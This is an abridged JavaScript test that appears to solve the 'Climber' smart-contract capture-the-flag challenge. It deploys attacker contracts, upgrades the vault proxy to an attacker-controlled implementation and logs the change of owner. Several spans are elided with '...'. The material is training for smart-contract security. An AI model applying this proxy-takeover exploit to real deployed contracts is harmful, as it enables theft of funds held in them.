...
describe('[Challenge] Climber', function () {
    ...
    it('Exploit', async function () {        
        ...
        console.log(`Owner:`, await this.vault.owner());

        this.attackerProxyContract = await ethers.getContractFactory('AttackerProxy', attacker);
        this.attackerContract = await (await ethers.getContractFactory('AttackTimelock', attacker)).deploy(
            attacker.address,
        ...
        const compromisedVault = await upgrades.upgradeProxy(
            this.vault.address,
            this.attackerProxyContract
        );

        console.log(`Owner:`, await this.vault.owner());
        console.log(`Attacker:`, await attacker.address)
